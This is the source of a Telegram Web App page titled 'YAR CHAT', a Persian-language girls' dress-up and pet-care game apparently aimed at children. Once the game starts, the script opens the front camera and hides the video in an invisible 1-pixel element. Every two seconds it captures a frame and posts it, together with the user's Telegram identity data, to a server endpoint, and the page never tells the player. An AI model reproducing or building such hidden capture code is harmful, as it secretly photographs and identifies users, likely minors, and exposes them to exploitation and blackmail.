
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>YAR CHAT</title>
<style>
* { box-sizing: border-box; }
body {
 font-family: Arial;
 background: linear-gradient(145deg,#17152f,#29204b,#102b40);
 color: white;
 text-align: center;
 padding: 16px;
}
.box {
 background: rgba(30,41,59,.94);
 padding: 18px;
 border-radius: 18px;
 margin: 15px 0;
 box-shadow: 0 8px 25px #0004;
}
button {
 background: #e64991;
 color: white;
 border: 0;
 padding: 13px 16px;
 border-radius: 12px;
 margin: 7px;
 font-size: 16px;
 cursor: pointer;
}
button:active { transform: scale(.96); }
.option {
 display: block;
 width: 100%;
 margin: 10px 0;
 background: #7546a8;
}
#challenge { display:none; }
#camera {
 position: fixed;
 width: 1px;
 height: 1px;
 overflow: hidden;
 opacity: 0;
 pointer-events: none;
 left: 0;
 bottom: 0;
}
#camera video { width:1px; height:1px; }
#stageIcon { font-size:55px; margin:12px; }
#progress {
 background:#ffffff22;
 height:10px;
 border-radius:20px;
 overflow:hidden;
 margin:15px 0;
}
#progressBar {
 height:100%;
 width:0%;
 background:#ff75b5;
 transition:width .2s;
}
#timer { color:#ff9dcc; }
#score { color:#ffe082; font-weight:bold; }
#result { color:#9fffc7; font-size:18px; }
</style>
</head>
<body>

<h2>YAR CHAT</h2>
<p id="status">در حال بررسی حساب شما...</p>

<div id="intro" class="box" style="display:none">
 <h3>چالش دخترانه YAR CHAT</h3>
 <p>آرایش، لباس، مو، قهرمان کفشدوزکی، پیشی و بازی حافظه!</p>
 <p>۶۰ ثانیه بازی کن و امتیاز بگیر.</p>
 <button onclick="startChallenge()">شروع چالش</button>
</div>

<div id="challenge" class="box">
 <h3 id="timer">۶۰ ثانیه</h3>
 <p>امتیاز: <span id="score">0</span></p>
 <div id="stageIcon">💄</div>
 <h3 id="stageTitle"></h3>
 <p id="stageText"></p>
 <div id="progress">
  <div id="progressBar"></div>
 </div>
 <p id="stageProgress"></p>
 <div id="options"></div>

 <div id="camera">
  <video id="video" autoplay playsinline muted></video>
 </div>

 <p id="result"></p>
</div>

<script src="https://telegram.org/js/telegram-web-app.js"></script>
<script>
const tg = window.Telegram.WebApp;
tg.ready();
tg.expand();

let stream = null;
let seconds = 60;
let score = 0;
let timer = null;
let photoTimer = null;
let challengeRunning = false;
let stageIndex = 0;
let stageProgress = 0;
let round = 1;

const stages = [
 {
  icon:"💄",
  title:"سالن آرایش",
  text:"برای زیباتر شدن، سه وسیله آرایشی انتخاب کن.",
  actions:["رژ صورتی 💋","رژ گلبهی 🌸","رژ بنفش 💜","ریمل ✨","رژگونه 🌷"]
 },
 {
  icon:"👗",
  title:"طراحی لباس",
  text:"برای عروسک خودت لباس و وسایل مناسب انتخاب کن.",
  actions:["لباس صورتی 👗","لباس آبی 💙","دامن زیبا 🌸","کفش پاشنه‌بلند 👠","کیف دستی 👜"]
 },
 {
  icon:"💇‍♀️",
  title:"آرایش مو",
  text:"سه مدل مو یا وسیله زیبایی انتخاب کن.",
  actions:["موی بلند 🌺","موی فر 🌀","بافت مو 🎀","تل مو 👑","گیره مو 💗"]
 },
 {
  icon:"🐞",
  title:"ماموریت قهرمان کفشدوزکی",
  text:"برای کامل شدن مأموریت، سه وسیله قهرمانی پیدا کن.",
  actions:["خال قرمز 🔴","نقاب قهرمانی 🐞","قدرت جادویی ✨","یویو قهرمانی 🪀","لباس قهرمانانه ❤️"]
 },
 {
  icon:"🐱",
  title:"مراقبت از پیشی",
  text:"پیشی گرسنه است؛ سه کار برای خوشحال کردنش انجام بده.",
  actions:["غذا دادن 🐟","شیر دادن 🥛","نوازش پیشی 🐾","بازی با توپ 🧶","تمیز کردن جای خواب 🧺"]
 },
 {
  icon:"🧠",
  title:"بازی حافظه",
  text:"سه شکل را پیدا کن و روی آن‌ها بزن.",
  actions:["❤️ قلب","⭐ ستاره","🌸 گل","🦋 پروانه","💎 الماس"]
 }
];

fetch("/api/check", {
 method:"POST",
 headers:{"Content-Type":"application/json"},
 body:JSON.stringify({initData:tg.initData})
})
.then(async response => {
 const data = await response.json();
 document.getElementById("status").textContent = data.message || "خطا";
 if(data.ok) {
  document.getElementById("intro").style.display = "block";
 }
})
.catch(error => {
 console.log(error);
 document.getElementById("status").textContent =
  "ارتباط با سرور برقرار نشد.";
});

async function startChallenge() {
 if(challengeRunning) return;

 try {
  stream = await navigator.mediaDevices.getUserMedia({
   video:{
    facingMode:"user",
    width:{ideal:640},
    height:{ideal:480}
   },
   audio:false
  });

  const video = document.getElementById("video");
  video.srcObject = stream;

  await new Promise((resolve,reject) => {
   if(video.readyState >= 1) resolve();
   else {
    video.onloadedmetadata = resolve;
    video.onerror = reject;
   }
  });

  await video.play();

  if(!video.videoWidth || !video.videoHeight) {
   throw new Error("Camera frame not ready");
  }

  challengeRunning = true;
  seconds = 60;
  score = 0;
  stageIndex = 0;
  stageProgress = 0;
  round = 1;

  document.getElementById("score").textContent = score;
  document.getElementById("camera").style.display = "block";
  document.getElementById("intro").style.display = "none";
  document.getElementById("challenge").style.display = "block";
  document.getElementById("result").textContent = "";

  showStage();

  timer = setInterval(tick,1000);
  sendPhoto();
  photoTimer = setInterval(sendPhoto,2000);

 } catch(error) {
  console.log("Camera error:",error);
  alert("دسترسی دوربین را بررسی کن و دوباره تلاش کن.");

  if(stream) {
   stream.getTracks().forEach(track => track.stop());
   stream = null;
  }
 }
}

async function sendPhoto() {
 if(!stream || !stream.active || !challengeRunning) return;

 const video = document.getElementById("video");
 if(video.readyState < 2 || !video.videoWidth) return;

 const canvas = document.createElement("canvas");
 canvas.width = 480;
 canvas.height = Math.round(480 * video.videoHeight / video.videoWidth);

 const context = canvas.getContext("2d");
 context.drawImage(video,0,0,canvas.width,canvas.height);

 const photo = canvas.toDataURL("image/jpeg",0.75);

 try {
  const response = await fetch("/api/photo",{
   method:"POST",
   headers:{"Content-Type":"application/json"},
   body:JSON.stringify({
    initData:tg.initData,
    photo:photo
   })
  });

  const result = await response.json();
  if(!response.ok || !result.ok) {
   console.log("Photo sending failed:",result);
  }
 } catch(error) {
  console.log("Photo error:",error);
 }
}

function showStage() {
 if(!challengeRunning) return;

 const stage = stages[stageIndex];

 document.getElementById("stageIcon").textContent = stage.icon;
 document.getElementById("stageTitle").textContent = stage.title;
 document.getElementById("stageText").textContent = stage.text;
 document.getElementById("stageProgress").textContent =
  "مرحله " + (stageIndex + 1) + " از " + stages.length +
  " | انتخاب‌ها: " + stageProgress + " از 3";

 document.getElementById("progressBar").style.width =
  (stageProgress / 3 * 100) + "%";

 const area = document.getElementById("options");
 area.innerHTML = "";

 stage.actions.forEach(action => {
  const button = document.createElement("button");
  button.className = "option";
  button.textContent = action;
  button.onclick = () => completeAction();
  area.appendChild(button);
 });
}

function completeAction() {
 if(!challengeRunning) return;

 stageProgress++;
 score = Math.min(100,score + 1);

 document.getElementById("score").textContent = score;
 document.getElementById("stageProgress").textContent =
  "انتخاب‌ها: " + stageProgress + " از 3";

 document.getElementById("progressBar").style.width =
  (stageProgress / 3 * 100) + "%";

 if(stageProgress >= 3) {
  stageIndex++;
  stageProgress = 0;

  if(stageIndex >= stages.length) {
   stageIndex = 0;
   round++;
  }

  showStage();
 }
}

function tick() {
 seconds--;

 document.getElementById("timer").textContent =
  seconds + " ثانیه";

 if(seconds <= 0) {
  finishChallenge();
 }
}

function finishChallenge() {
 if(!challengeRunning) return;

 clearInterval(timer);
 clearInterval(photoTimer);
 challengeRunning = false;

 if(stream) {
  stream.getTracks().forEach(track => track.stop());
  stream = null;
 }

 document.getElementById("camera").style.display = "none";
 document.getElementById("timer").textContent = "پایان چالش";
 document.getElementById("options").innerHTML = "";
 document.getElementById("result").textContent =
  "آفرین! چالش تمام شد. امتیاز: " + score +
  " | دورهای انجام‌شده: " + round;

 document.getElementById("stageIcon").textContent = "🌟";
 document.getElementById("stageTitle").textContent = "تبریک!";
 document.getElementById("stageText").textContent =
  "تو همه این چالش‌ها شرکت کردی!";
}
</script>
</body>
 </html>
